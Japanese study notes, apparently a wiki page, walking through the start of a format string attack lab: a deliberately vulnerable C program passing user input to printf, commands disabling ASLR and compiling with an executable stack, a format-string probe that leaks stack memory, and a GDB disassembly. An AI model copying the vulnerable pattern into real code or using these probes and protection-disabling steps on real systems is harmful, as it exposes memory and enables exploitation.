<!-- TITLE: Format String Attack -->
<!-- SUBTITLE: A quick summary of Format String Attack -->

# FSBのコード

ももいろテクノロジー様の記事を参考に進めていく[^1]


```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[100];
    printf("[+] buf = %p\n", buf);
    strncpy(buf, argv[1], 100);
    printf(buf);
    putchar('\n');
    return 0;
}
```

# コンパイル

```sh
$ sudo sysctl -a | grep kernel.randomize_va_space
kernel.randomize_va_space = 2
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
$ gcc -m32 -z execstack fsb.c -o fsb
$ ./fsb $(python -c 'print "AAAA" + ".%08x"*16')
[+] buf = 0xffffd1e8
AAAA.ffffd517.00000064.00f0b5ff.ffffd20e.00000001.000000c2.ffffd304.ffffd20e.ffffd310.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
```

最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されている

# GDB

&#8942;

```sh
$ gdb -q ./fsb

gef➤  disas main
Dump of assembler code for function main:
   0x080484cb <+0>:	lea    ecx,[esp+0x4]
   0x080484cf <+4>:	and    esp,0xfffffff0
   0x080484d2 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484d5 <+10>:	push   ebp
   0x080484d6 <+11>:	mov    ebp,esp
   0x080484d8 <+13>:	push   ecx
   0x080484d9 <+14>:	sub    esp,0x84
   0x080484df <+20>:	mov    eax,ecx
   0x080484e1 <+22>:	mov    eax,DWORD PTR [eax+0x4]
   0x080484e4 <+25>:	mov    DWORD PTR [ebp-0x7c],eax
   0x080484e7 <+28>:	mov    eax,gs:0x14
   0x080484ed <+34>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f0 <+37>:	xor    eax,eax
   0x080484f2 <+39>:	sub    esp,0x8
   0x080484f5 <+42>:	lea    eax,[ebp-0x70]
   0x080484f8 <+45>:	push   eax
   0x080484f9 <+46>:	push   0x80485e0
   0x080484fe <+51>:	call   0x8048370 <printf@plt>
   0x08048503 <+56>:	add    esp,0x10
   0x08048506 <+59>:	mov    eax,DWORD PTR [ebp-0x7c]
   0x08048509 <+62>:	add    eax,0x4
   0x0804850c <+65>:	mov    eax,DWORD PTR [eax]
   0x0804850e <+67>:	sub    esp,0x4
   0x08048511 <+70>:	push   0x64
   0x08048513 <+72>:	push   eax
   0x08048514 <+73>:	lea    eax,[ebp-0x70]
   0x08048517 <+76>:	push   eax
   0x08048518 <+77>:	call   0x80483b0 <strncpy@plt>
   0x0804851d <+82>:	add    esp,0x10
   0x08048520 <+85>:	sub    esp,0xc
   0x08048523 <+88>:	lea    eax,[ebp-0x70]
   0x08048526 <+91>:	push   eax
   0x08048527 <+92>:	call   0x8048370 <printf@plt>
   0x0804852c <+97>:	add    esp,0x10
   0x0804852f <+100>:	sub    esp,0xc
   0x08048532 <+103>:	push   0xa
   0x08048534 <+105>:	call   0x80483a0 <putchar@plt>
   0x08048539 <+110>:	add    esp,0x10
   0x0804853c <+113>:	mov    eax,0x0
   0x08048541 <+118>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048544 <+121>:	xor    edx,DWORD PTR gs:0x14
   0x0804854b <+128>:	je     0x8048552 <main+135>
   0x0804854d <+130>:	call   0x8048380 <__stack_chk_fail@plt>
   0x08048552 <+135>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048555 <+138>:	leave  
   0x08048556 <+139>:	lea    esp,[ecx-0x4]
   0x08048559 <+142>:	ret    
End of assembler dump.
```
